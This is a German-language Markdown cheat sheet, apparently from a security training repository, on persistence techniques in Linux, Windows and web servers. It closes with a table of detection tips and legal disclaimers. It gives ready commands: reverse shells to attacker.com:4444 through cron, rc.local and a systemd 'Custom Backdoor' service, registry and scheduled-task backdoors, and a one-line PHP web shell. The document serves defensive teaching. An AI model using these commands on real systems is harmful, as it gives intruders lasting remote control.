# 🛡️ Persistence Techniques in Linux, Windows & Web Environments

**Zweck dieser Datei:**  
Diese Datei dient dazu, typische Persistenzmechanismen von Angreifern auf Linux- und Windows-Systemen zu verstehen. Solche Techniken sichern nach einem erfolgreichen Angriff einen dauerhaften Zugriff – selbst nach einem Neustart oder Reboot.  
Ziel: Sicherheitsverantwortliche, Forensiker und Pentester sollen diese Methoden erkennen, simulieren und verteidigen können.

> ⚠️ **Disclaimer:** Dieses Dokument ist ausschließlich zu Schulungs- und Awareness-Zwecken gedacht. Alle beschriebenen Techniken dürfen nur in autorisierten Testumgebungen (z. B. in CTFs, Homelabs oder im Rahmen eines Red-Team-Assessments) eingesetzt werden.

---

## 🐧 Linux Persistence Techniques

### 🔁 1. Cronjob-Based Persistence

Angreifer können sich wiederholend Shells oder Skripte ausführen lassen:

```bash
(crontab -l ; echo "* * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1") | crontab -
```
➡️ Erstellt eine Reverse Shell jede Minute.

### 🔌 2. /etc/rc.local
Diese Datei wird beim Booten des Systems ausgeführt:

```bash
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /etc/rc.local
chmod +x /etc/rc.local
```
➡️ Persistente Reverse Shell nach Neustart.

### 🧠 3. Systemd Services
Erstellen eines eigenen Services:

```bash
cat <<EOF > /etc/systemd/system/sys-persist.service
[Unit]
Description=Custom Backdoor

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

[Install]
WantedBy=multi-user.target
EOF

systemctl enable sys-persist
```
➡️ Angreifer tarnen ihre Services als legitime Dienste.

---

## 🪟 Windows Persistence Techniques

### 🪟 1. Registry Autoruns (HKCU / HKLM)

```powershell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\Users\user\backdoor.exe"
```
➡️ Führt eine Payload beim Benutzer-Login aus.

### 🕒 2. Scheduled Tasks

```powershell
schtasks /create /tn "WinUpdate" /tr "C:\backdoor.exe" /sc minute /mo 5
```
➡️ Führt alle 5 Minuten den Payload aus.

### 🦠 3. DLL Hijacking oder Startup Folder
- Drop von `.exe` oder `.lnk-Dateien` in %`APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
- DLL-Ersetzung bei anfälligen Programmen (z. B. calc.exe lädt unsichere DLLs)

---

## 🌐 Webshell Persistence

### 🕸️ 1. Versteckte Dateinamen

Angreifer tarnen Webshells, z. B.:

- .htaccess.php
- index.php.jpg
- cmd.php%00.jpg

➡️ Auf den ersten Blick nicht als PHP-Skript erkennbar.

### 🗂️ 2. Tief verschachtelte Ordner

Webshells werden in tiefen Unterordnern abgelegt:

```swift
/var/www/html/wp-content/themes/twentyfifteen/assets/.cache/tmp/cmd.php
```
➡️ Administratoren übersehen solche Pfade oft.

### 🐚 3. In legitime Dateien injiziert

Code-Injektion in bereits vorhandene Dateien:

```php
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
```
➡️ Schlecht gewartete Webserver erkennen solche Injektionen nicht.

--- 

## 🧩 Tipps zur Erkennung & Abwehr

| Technik           | Abwehrmöglichkeit                          |
| ----------------- | ------------------------------------------ |
| Cronjobs          | `crontab -l`, `/etc/crontab`, Auditd       |
| rc.local          | `diff /etc/rc.local` gegen Backup prüfen   |
| Registry Autoruns | Autoruns.exe (Sysinternals)                |
| Scheduled Tasks   | `schtasks /query`                          |
| Webshells         | Dateiüberwachung, Signaturen, Virenscanner |
| Systemd Services  | `systemctl list-units --type=service`      |

--- 

🔐 **Merke:** Jede Persistenztechnik kann ein Einfallstor für Angreifer oder Malware sein. Frühzeitige Erkennung durch Logging, Monitoring und File Integrity Checks ist entscheidend.

---

## ⚠️ Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

--- 

Stay methodical. Stay legal. Stay secure. 🔐

🗓️ **Letzte Aktualisierung:** Juli 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---